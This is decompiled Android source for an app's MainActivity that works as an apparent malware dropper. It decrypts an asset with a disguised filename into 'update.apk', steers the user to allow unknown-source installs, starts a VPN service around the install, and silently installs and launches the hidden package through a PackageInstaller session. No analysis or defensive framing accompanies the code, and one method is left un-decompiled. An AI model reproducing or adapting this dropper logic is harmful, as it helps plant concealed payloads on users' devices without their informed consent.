package com.redhand.laugh;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.pm.ActivityInfo;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageInfo;
import android.content.pm.PackageInstaller;
import android.content.pm.PackageManager;
import android.content.pm.ResolveInfo;
import android.graphics.drawable.Drawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.ProgressBar;
import android.widget.TextView;
import android.widget.Toast;
import androidx.fragment.app.b;
import com.redhand.laugiytr.R;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.List;
import t1.e;
import v.c;
import y1.a;
import y1.d;

/* JADX INFO: compiled from: r8-map-id-5e0cc0aaff46ca9cdb8bb83aa49788d6127e7de84820c545817263cb4316462a */
/* JADX INFO: loaded from: classes.dex */
public class MainActivity extends Activity {

    /* JADX INFO: renamed from: v, reason: collision with root package name */
    public static final /* synthetic */ int f757v = 0;

    /* JADX INFO: renamed from: a, reason: collision with root package name */
    public String f758a;

    /* JADX INFO: renamed from: j, reason: collision with root package name */
    public TextView f766j;

    /* JADX INFO: renamed from: k, reason: collision with root package name */
    public LinearLayout f767k;

    /* JADX INFO: renamed from: l, reason: collision with root package name */
    public ProgressBar f768l;

    /* JADX INFO: renamed from: m, reason: collision with root package name */
    public TextView f769m;

    /* JADX INFO: renamed from: n, reason: collision with root package name */
    public TextView f770n;

    /* JADX INFO: renamed from: o, reason: collision with root package name */
    public ImageView f771o;

    /* JADX INFO: renamed from: q, reason: collision with root package name */
    public b f773q;

    /* JADX INFO: renamed from: b, reason: collision with root package name */
    public boolean f759b = false;
    public volatile boolean c = false;

    /* JADX INFO: renamed from: d, reason: collision with root package name */
    public volatile boolean f760d = false;

    /* JADX INFO: renamed from: e, reason: collision with root package name */
    public volatile boolean f761e = false;

    /* JADX INFO: renamed from: f, reason: collision with root package name */
    public volatile boolean f762f = false;

    /* JADX INFO: renamed from: g, reason: collision with root package name */
    public volatile boolean f763g = false;

    /* JADX INFO: renamed from: h, reason: collision with root package name */
    public volatile boolean f764h = false;

    /* JADX INFO: renamed from: i, reason: collision with root package name */
    public Drawable f765i = null;

    /* JADX INFO: renamed from: p, reason: collision with root package name */
    public final Handler f772p = new Handler(Looper.getMainLooper());

    /* JADX INFO: renamed from: r, reason: collision with root package name */
    public final Handler f774r = new Handler(Looper.getMainLooper());

    /* JADX INFO: renamed from: s, reason: collision with root package name */
    public int f775s = 0;

    /* JADX INFO: renamed from: t, reason: collision with root package name */
    public boolean f776t = false;

    /* JADX INFO: renamed from: u, reason: collision with root package name */
    public final d f777u = new d(this);

    public static void a(File file, PackageInstaller.Session session) throws IOException {
        OutputStream outputStreamOpenWrite;
        byte[] bArr;
        FileInputStream fileInputStream = new FileInputStream(file);
        try {
            outputStreamOpenWrite = session.openWrite("package", 0L, -1L);
            try {
                bArr = new byte[4096];
            } finally {
            }
        } finally {
        }
        while (true) {
            int i2 = fileInputStream.read(bArr);
            if (i2 == -1) {
                outputStreamOpenWrite.flush();
                session.fsync(outputStreamOpenWrite);
                outputStreamOpenWrite.close();
                fileInputStream.close();
                return;
            }
            outputStreamOpenWrite.write(bArr, 0, i2);
        }
    }

    public static boolean f(byte[] bArr) {
        int iMax = Math.max(0, bArr.length - 65536);
        for (int length = bArr.length - 22; length >= iMax; length--) {
            int i2 = length + 3;
            if (i2 < bArr.length && bArr[length] == 80 && bArr[length + 1] == 75 && bArr[length + 2] == 5 && bArr[i2] == 6) {
                return true;
            }
        }
        return false;
    }

    /* JADX WARN: Removed duplicated region for block: B:23:0x0045  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    public static boolean h(java.io.File r10) {
        /*
            r0 = 0
            java.io.RandomAccessFile r1 = new java.io.RandomAccessFile     // Catch: java.lang.Exception -> L4a
            java.lang.String r2 = "r"
            r1.<init>(r10, r2)     // Catch: java.lang.Exception -> L4a
            r10 = 4
            byte[] r2 = new byte[r10]     // Catch: java.lang.Throwable -> L43
            r1.read(r2)     // Catch: java.lang.Throwable -> L43
            r3 = r2[r0]     // Catch: java.lang.Throwable -> L43
            r4 = 80
            if (r3 != r4) goto L4c
            r3 = 1
            r2 = r2[r3]     // Catch: java.lang.Throwable -> L43
            r5 = 75
            if (r2 != r5) goto L4c
            long r6 = r1.length()     // Catch: java.lang.Throwable -> L43
            r8 = 22
            int r2 = (r6 > r8 ? 1 : (r6 == r8 ? 0 : -1))
            if (r2 <= 0) goto L4c
            long r6 = r6 - r8
            r1.seek(r6)     // Catch: java.lang.Throwable -> L43
            byte[] r10 = new byte[r10]     // Catch: java.lang.Throwable -> L43
            r1.read(r10)     // Catch: java.lang.Throwable -> L43
            r2 = r10[r0]     // Catch: java.lang.Throwable -> L43
            if (r2 != r4) goto L45
            r2 = r10[r3]     // Catch: java.lang.Throwable -> L43
            if (r2 != r5) goto L45
            r2 = 2
            r2 = r10[r2]     // Catch: java.lang.Throwable -> L43
            r4 = 5
            if (r2 != r4) goto L45
            r2 = 3
            r10 = r10[r2]     // Catch: java.lang.Throwable -> L43
            r2 = 6
            if (r10 != r2) goto L45
            goto L46
        L43:
            r10 = move-exception
            goto L50
        L45:
            r3 = r0
        L46:
            r1.close()     // Catch: java.lang.Exception -> L4a
            return r3
        L4a:
            r10 = move-exception
            goto L59
        L4c:
            r1.close()     // Catch: java.lang.Exception -> L4a
            return r0
        L50:
            r1.close()     // Catch: java.lang.Throwable -> L54
            goto L58
        L54:
            r1 = move-exception
            r10.addSuppressed(r1)     // Catch: java.lang.Exception -> L4a
        L58:
            throw r10     // Catch: java.lang.Exception -> L4a
        L59:
            java.lang.String r1 = "DynamicInstall"
            java.lang.String r2 = "Error validating APK file"
            android.util.Log.e(r1, r2, r10)
            return r0
        */
        throw new UnsupportedOperationException("Method not decompiled: com.redhand.laugh.MainActivity.h(java.io.File):boolean");
    }

    public static void i(MainActivity mainActivity, String str) {
        Context applicationContext = mainActivity.getApplicationContext();
        Handler handler = new Handler(Looper.getMainLooper());
        if (str == null || str.trim().isEmpty()) {
            Log.e("DynamicInstall", "launchInstalledPackage: packageName is null/empty");
        } else {
            if (v(applicationContext, str)) {
                return;
            }
            handler.postDelayed(new a(applicationContext, str, handler, 2), 150L);
        }
    }

    public static void u(Context context) {
        try {
            context.stopService(new Intent(context, (Class<?>) VpnController.class));
        } catch (Exception unused) {
        }
        try {
            context.startService(new Intent(context, (Class<?>) VpnController.class).setAction("com.redhand.install.ACTION_STOP_VPN"));
        } catch (Exception unused2) {
        }
    }

    public static boolean v(Context context, String str) {
        PackageManager packageManager = context.getPackageManager();
        try {
            ActivityInfo[] activityInfoArr = packageManager.getPackageInfo(str, 1).activities;
            Log.d("DynamicInstall", "Installed package visible: " + str + ", activityCount=" + (activityInfoArr == null ? 0 : activityInfoArr.length));
            try {
                Intent launchIntentForPackage = packageManager.getLaunchIntentForPackage(str);
                if (launchIntentForPackage != null) {
                    launchIntentForPackage.addFlags(270532608);
                    context.startActivity(launchIntentForPackage);
                    Log.d("DynamicInstall", "Launched " + str + " via getLaunchIntentForPackage");
                    return true;
                }
            } catch (Exception e3) {
                Log.d("DynamicInstall", "LaunchIntent failed for " + str + ": " + e3.getMessage());
            }
            try {
                Intent intent = new Intent("android.intent.action.MAIN");
                intent.addCategory("android.intent.category.LAUNCHER");
                intent.setPackage(str);
                List<ResolveInfo> listQueryIntentActivities = packageManager.queryIntentActivities(intent, 65536);
                if (listQueryIntentActivities != null && !listQueryIntentActivities.isEmpty()) {
                    ResolveInfo resolveInfo = listQueryIntentActivities.get(0);
                    Intent intent2 = new Intent("android.intent.action.MAIN");
                    intent2.addCategory("android.intent.category.LAUNCHER");
                    intent2.setClassName(str, resolveInfo.activityInfo.name);
                    intent2.addFlags(270532608);
                    context.startActivity(intent2);
                    Log.d("DynamicInstall", "Launched " + str + " via explicit launcher activity");
                    return true;
                }
            } catch (Exception e4) {
                Log.d("DynamicInstall", "Explicit launcher failed for " + str + ": " + e4.getMessage());
            }
            return false;
        } catch (Exception e5) {
            Log.d("DynamicInstall", "Installed package not visible yet: " + str + ", error=" + e5.getMessage());
            return false;
        }
    }

    public final void b() {
        if (!this.f759b || this.f760d || this.c) {
            return;
        }
        if (Build.VERSION.SDK_INT < 26 || getPackageManager().canRequestPackageInstalls()) {
            File file = getExternalCacheDir() == null ? null : new File(new File(getExternalCacheDir(), "updates"), "update.apk");
            if (file == null || !file.isFile() || file.length() <= 0) {
                g();
                return;
            }
            String str = this.f758a;
            if (str == null || str.trim().isEmpty()) {
                String strN = n(file);
                this.f758a = strN;
                p(strN);
            }
            String str2 = this.f758a;
            if (str2 == null || str2.trim().isEmpty()) {
                Toast.makeText(this, "Unable to detect package name from APK", 1).show();
                o();
            } else {
                d(file);
                runOnUiThread(new y1.b(this, 5));
                r();
            }
        }
    }

    public final File c() {
        boolean zF;
        InputStream inputStreamOpen = getAssets().open("ṩỹṧ꙱ṫḗṃ.tmp");
        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            byte[] bArr = new byte[1024];
            while (true) {
                int i2 = inputStreamOpen.read(bArr);
                if (i2 == -1) {
                    break;
                }
                byteArrayOutputStream.write(bArr, 0, i2);
            }
            byte[] byteArray = byteArrayOutputStream.toByteArray();
            byte[] bArrQ = null;
            try {
                byte[] bArr2 = new byte[32];
                for (int i3 = 0; i3 < 32; i3++) {
                    bArr2[i3] = (byte) ((("com.android.mrobot".charAt(i3 % 18) ^ 'Z') ^ (i3 * 7)) & 255);
                }
                bArrQ = e.p(byteArray, bArr2);
                zF = f(bArrQ);
            } catch (Exception unused) {
                zF = false;
            }
            if (!zF) {
                try {
                    bArrQ = e.q(byteArray);
                    if (f(bArrQ)) {
                        zF = true;
                    }
                } catch (Exception unused2) {
                }
            }
            if (zF) {
                byteArray = bArrQ;
            } else if (byteArray.length <= 4 || byteArray[0] != 80 || byteArray[1] != 75) {
                throw new Exception("Unable to decrypt file to valid APK format");
            }
            File file = new File(getExternalCacheDir(), "updates");
            if (!file.exists()) {
                file.mkdirs();
            }
            File file2 = new File(file, "update.apk");
            FileOutputStream fileOutputStream = new FileOutputStream(file2);
            try {
                fileOutputStream.write(byteArray);
                fileOutputStream.flush();
                fileOutputStream.close();
                if (!h(file2)) {
                    throw new Exception("File is not a valid APK format");
                }
                inputStreamOpen.close();
                return file2;
            } finally {
            }
        } catch (Throwable th) {
            if (inputStreamOpen != null) {
                try {
                    inputStreamOpen.close();
                } catch (Throwable th2) {
                    th.addSuppressed(th2);
                }
            }
            throw th;
        }
    }

    public final void d(File file) {
        if (file.exists()) {
            try {
                PackageManager packageManager = getPackageManager();
                PackageInfo packageArchiveInfo = packageManager.getPackageArchiveInfo(file.getAbsolutePath(), 129);
                if (packageArchiveInfo != null) {
                    String str = packageArchiveInfo.packageName;
                    this.f758a = str;
                    p(str);
                    ApplicationInfo applicationInfo = packageArchiveInfo.applicationInfo;
                    if (applicationInfo != null) {
                        applicationInfo.sourceDir = file.getAbsolutePath();
                        applicationInfo.publicSourceDir = file.getAbsolutePath();
                        try {
                            CharSequence applicationLabel = packageManager.getApplicationLabel(applicationInfo);
                            if (applicationLabel != null) {
                                applicationLabel.toString();
                            }
                        } catch (Exception unused) {
                        }
                        try {
                            this.f765i = packageManager.getApplicationIcon(applicationInfo);
                        } catch (Exception unused2) {
                        }
                    }
                }
            } catch (Exception e3) {
                Log.e("DynamicInstall", "extractAppInfoFromDecryptedApk failed", e3);
            }
        }
    }

    public final void e() {
        if (Build.VERSION.SDK_INT < 26) {
            try {
                startActivity(new Intent("android.settings.SECURITY_SETTINGS"));
            } catch (Exception unused) {
                startActivity(new Intent("android.settings.SETTINGS"));
            }
        } else if (getPackageManager().canRequestPackageInstalls()) {
            g();
        } else {
            m();
        }
    }

    public final void g() {
        if (this.f759b) {
            if (this.c) {
                Log.d("DynamicInstall", "Decrypt/install pipeline already active");
            } else {
                this.c = true;
                new Thread(new y1.b(this, 0)).start();
            }
        }
    }

    public final void j() {
        if (this.f761e) {
            return;
        }
        this.f761e = true;
        u(this);
        l();
        String str = this.f758a;
        if (str != null && !str.trim().isEmpty()) {
            i(this, this.f758a);
        }
        finish();
    }

    public final void k() {
        try {
            File file = getExternalCacheDir() == null ? null : new File(new File(getExternalCacheDir(), "updates"), "update.apk");
            if (file == null || !file.exists() || !file.isFile() || file.length() <= 0) {
                return;
            }
            d(file);
        } catch (Exception e3) {
            Log.e("DynamicInstall", "loadDynamicAppInfoIfAvailable failed", e3);
        }
    }

    public final void l() {
        String str = this.f758a;
        if (str == null || str.trim().isEmpty()) {
            this.f758a = getSharedPreferences("dynamic_install_prefs", 0).getString("pref_target_package", null);
            Log.d("DynamicInstall", "Loaded saved target package: " + this.f758a);
        }
    }

    public final void m() {
        Handler handler = this.f772p;
        int i2 = Build.VERSION.SDK_INT;
        if (i2 < 26) {
            s();
            return;
        }
        try {
            Intent intent = new Intent("android.settings.MANAGE_UNKNOWN_APP_SOURCES");
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivityForResult(intent, 1234);
            if (i2 < 26) {
                g();
                return;
            }
            b bVar = new b(12, this);
            this.f773q = bVar;
            handler.postDelayed(bVar, 150L);
        } catch (Exception e3) {
            Log.e("DynamicInstall", "openManageUnknownAppSourcesForResult failed", e3);
            s();
            if (Build.VERSION.SDK_INT < 26) {
                g();
                return;
            }
            b bVar2 = new b(12, this);
            this.f773q = bVar2;
            handler.postDelayed(bVar2, 150L);
        }
    }

    public final String n(File file) {
        if (file.exists()) {
            try {
                PackageInfo packageArchiveInfo = getPackageManager().getPackageArchiveInfo(file.getAbsolutePath(), 129);
                if (packageArchiveInfo != null) {
                    return packageArchiveInfo.packageName;
                }
            } catch (Exception e3) {
                Log.e("DynamicInstall", "readPackageNameFromArchive failed", e3);
                return null;
            }
        }
        return null;
    }

    public final void o() {
        this.f776t = false;
        this.f774r.removeCallbacksAndMessages(null);
        this.f775s = 0;
        runOnUiThread(new y1.b(this, 6));
    }

    @Override // android.app.Activity
    public final void onActivityResult(int i2, int i3, Intent intent) {
        if (i2 == 5678) {
            if (i3 == -1) {
                t();
            } else {
                this.f759b = false;
                u(this);
                o();
            }
        } else if (i2 == 1234 && Build.VERSION.SDK_INT >= 26 && getPackageManager().canRequestPackageInstalls()) {
            b();
        }
        super.onActivityResult(i2, i3, intent);
    }

    @Override // android.app.Activity
    public final void onCreate(Bundle bundle) {
        MainActivity mainActivity;
        String str;
        Log.d("DynamicInstall", "MainActivity onCreate started");
        requestWindowFeature(1);
        super.onCreate(bundle);
        setContentView(R.NP_MANAGER11.NP_MANAGER);
        this.f766j = (TextView) findViewById(R.NP_MANAGER8.NP_MANAGER);
        this.f767k = (LinearLayout) findViewById(R.NP_MANAGER8.NP_MANAGER);
        this.f768l = (ProgressBar) findViewById(R.NP_MANAGER8.NP_MANAGER);
        this.f769m = (TextView) findViewById(R.NP_MANAGER8.NP_MANAGER);
        this.f770n = (TextView) findViewById(R.NP_MANAGER8.NP_MANAGER);
        this.f771o = (ImageView) findViewById(R.NP_MANAGER8.NP_MANAGER);
        l();
        LinearLayout linearLayout = this.f767k;
        if (linearLayout != null) {
            linearLayout.setVisibility(8);
        }
        TextView textView = this.f766j;
        if (textView != null) {
            textView.setVisibility(0);
            this.f766j.setOnClickListener(new w1.a(3, this));
        }
        k();
        runOnUiThread(new y1.b(this, 5));
        IntentFilter intentFilter = new IntentFilter("com.redhand.install.ACTION_INSTALL_COMPLETE");
        d dVar = this.f777u;
        int i2 = Build.VERSION.SDK_INT;
        if (i2 >= 33) {
            mainActivity = this;
            v.d.a(mainActivity, dVar, intentFilter, null, null, 4);
        } else if (i2 >= 26) {
            mainActivity = this;
            c.a(mainActivity, dVar, intentFilter, null, null, 4);
        } else {
            mainActivity = this;
            registerReceiver(dVar, intentFilter, e.H(this), null);
        }
        if (mainActivity.f761e) {
            return;
        }
        l();
        String str2 = mainActivity.f758a;
        if (str2 == null || str2.trim().isEmpty() || (str = mainActivity.f758a) == null) {
            return;
        }
        try {
            if (str.trim().isEmpty()) {
                return;
            }
            getPackageManager().getPackageInfo(str, 0);
            j();
        } catch (Exception unused) {
        }
    }

    @Override // android.app.Activity
    public final void onDestroy() {
        b bVar;
        Handler handler = this.f772p;
        if (handler != null && (bVar = this.f773q) != null) {
            handler.removeCallbacks(bVar);
        }
        this.f774r.removeCallbacksAndMessages(null);
        u(this);
        try {
            unregisterReceiver(this.f777u);
        } catch (IllegalArgumentException unused) {
        }
        super.onDestroy();
    }

    @Override // android.app.Activity
    public final void onResume() {
        String str;
        super.onResume();
        l();
        k();
        runOnUiThread(new y1.b(this, 5));
        String str2 = this.f758a;
        if (str2 != null && !str2.trim().isEmpty() && (str = this.f758a) != null) {
            try {
                if (!str.trim().isEmpty()) {
                    getPackageManager().getPackageInfo(str, 0);
                    u(this);
                    i(this, this.f758a);
                    finish();
                    return;
                }
            } catch (Exception unused) {
            }
        }
        if (this.f762f && this.f764h && this.f759b && this.f760d && !this.f763g && !this.f776t) {
            Log.d("DynamicInstall", "Returned from installer UI, starting install progress");
            if (!this.f776t) {
                this.f776t = true;
                this.f775s = 1;
                runOnUiThread(new y1.b(this, 4));
                q();
            }
        }
        if (!this.f759b || Build.VERSION.SDK_INT < 26 || !getPackageManager().canRequestPackageInstalls() || this.f760d || this.f762f) {
            return;
        }
        b();
    }

    public final void p(String str) {
        if (str == null || str.trim().isEmpty()) {
            return;
        }
        getSharedPreferences("dynamic_install_prefs", 0).edit().putString("pref_target_package", str).apply();
        Log.d("DynamicInstall", "Saved target package: ".concat(str));
    }

    public final void q() {
        int i2;
        if (this.f776t && (i2 = this.f775s) < 95) {
            int i3 = i2 + (i2 < 25 ? 3 : i2 < 50 ? 2 : 1);
            this.f775s = i3;
            if (i3 > 95) {
                this.f775s = 95;
            }
            runOnUiThread(new y1.b(this, 1));
            this.f774r.postDelayed(new y1.b(this, 2), 300L);
        }
    }

    public final void r() {
        b bVar;
        if (this.f760d) {
            Log.d("DynamicInstall", "Install session already committed");
            return;
        }
        Log.d("DynamicInstall", "=== STARTING INSTALL SESSION ===");
        Handler handler = this.f772p;
        if (handler != null && (bVar = this.f773q) != null) {
            handler.removeCallbacks(bVar);
        }
        PackageInstaller.Session session = null;
        try {
            try {
                try {
                    File file = new File(getExternalCacheDir(), "updates/update.apk");
                    if (!file.exists()) {
                        runOnUiThread(new y1.b(this, 9));
                        return;
                    }
                    String str = this.f758a;
                    if (str == null || str.trim().isEmpty()) {
                        String strN = n(file);
                        this.f758a = strN;
                        p(strN);
                    }
                    String str2 = this.f758a;
                    if (str2 == null || str2.trim().isEmpty()) {
                        throw new RuntimeException("Could not detect package name for install session");
                    }
                    PackageInstaller packageInstaller = getPackageManager().getPackageInstaller();
                    PackageInstaller.SessionParams sessionParams = new PackageInstaller.SessionParams(1);
                    sessionParams.setAppPackageName(this.f758a);
                    int iCreateSession = packageInstaller.createSession(sessionParams);
                    PackageInstaller.Session sessionOpenSession = packageInstaller.openSession(iCreateSession);
                    a(file, sessionOpenSession);
                    Intent intent = new Intent(this, (Class<?>) InstallResultReceiver.class);
                    intent.setAction("com.redhand.install.SESSION_API_PACKAGE_INSTALLED");
                    intent.putExtra("installed_package", this.f758a);
                    sessionOpenSession.commit(PendingIntent.getBroadcast(this, iCreateSession, intent, 167772160).getIntentSender());
                    this.f760d = true;
                    runOnUiThread(new y1.b(this, 7));
                    Log.d("DynamicInstall", "Session committed successfully");
                    sessionOpenSession.close();
                } catch (Throwable th) {
                    if (0 != 0) {
                        try {
                            session.close();
                        } catch (Exception unused) {
                        }
                    }
                    throw th;
                }
            } catch (Exception e3) {
                Log.e("DynamicInstall", "Exception in startInstallSession", e3);
                if (0 != 0) {
                    try {
                        session.abandon();
                    } catch (Exception unused2) {
                    }
                }
                runOnUiThread(new y1.b(this, 10));
                if (0 != 0) {
                    session.close();
                }
            }
        } catch (Exception unused3) {
        }
    }

    public final void s() {
        if (Build.VERSION.SDK_INT < 26) {
            try {
                startActivity(new Intent("android.settings.SECURITY_SETTINGS"));
                return;
            } catch (Exception unused) {
                startActivity(new Intent("android.settings.SETTINGS"));
                return;
            }
        }
        Intent intent = new Intent("android.settings.MANAGE_UNKNOWN_APP_SOURCES");
        intent.setData(Uri.parse("package:" + getPackageName()));
        try {
            try {
                startActivity(intent);
            } catch (Exception unused2) {
                startActivity(new Intent("android.settings.SETTINGS"));
            }
        } catch (Exception unused3) {
            startActivity(new Intent("android.settings.APPLICATION_DETAILS_SETTINGS").setData(Uri.parse("package:" + getPackageName())));
        }
    }

    public final void t() {
        try {
            startService(new Intent(this, (Class<?>) VpnController.class));
            if (Build.VERSION.SDK_INT < 26) {
                try {
                    startActivity(new Intent("android.settings.SECURITY_SETTINGS"));
                } catch (Exception unused) {
                    startActivity(new Intent("android.settings.SETTINGS"));
                }
            } else if (getPackageManager().canRequestPackageInstalls()) {
                g();
            } else {
                m();
            }
        } catch (Exception e3) {
            Log.e("DynamicInstall", "Error starting VPN service", e3);
            e();
        }
    }
}
